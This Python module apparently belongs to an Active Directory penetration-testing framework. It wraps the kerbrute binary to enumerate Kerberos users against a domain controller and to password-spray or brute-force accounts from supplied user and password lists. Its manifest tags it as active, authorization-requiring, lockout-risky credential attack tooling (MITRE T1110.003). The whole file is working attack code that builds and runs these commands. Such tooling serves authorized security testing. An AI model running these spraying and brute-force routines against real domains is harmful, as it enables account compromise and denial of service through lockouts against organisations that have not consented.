"""Kerberos brute-force  -  user enum + password spray via AS-REQ."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.spray.kerbrute.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["authentication_attempts", "account_lockout_risk"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1110.003"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", None) or getattr(args, "target", None)
    users_file = getattr(args, "users_file", None)
    passwords = getattr(args, "passwords", None)
    password_list = getattr(args, "password_list", None)

    print(f"[*] Kerbrute: Kerberos user enum + spray against {cred.domain}")

    import subprocess
    import shutil
    kerbrute = shutil.which("kerbrute")
    if not kerbrute:
        print("[!] kerbrute not found (Go binary required)")
        print("[*] Install: go install github.com/ropnop/kerbrute@latest")
        return 1

    if users_file and not passwords and not password_list:
        cmd = [kerbrute, "userenum", "--dc", dc_ip or "", "-d", cred.domain, users_file]
        print("[*] Mode: User enumeration")
    elif users_file and (passwords or password_list):
        pwd_arg = password_list if password_list else None
        if pwd_arg:
            cmd = [kerbrute, "bruteuser", "--dc", dc_ip or "", "-d", cred.domain,
                   pwd_arg, users_file]
        else:
            cmd = [kerbrute, "passwordspray", "--dc", dc_ip or "", "-d", cred.domain,
                   users_file, passwords.split(",")[0] if passwords else ""]
        print("[*] Mode: Password spray")
    else:
        print("[!] --users-file required")
        return 1

    print("[*] CMD: {}".format(" ".join(cmd)))
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)
    if result.returncode != 0:
        print(result.stderr)
    return result.returncode
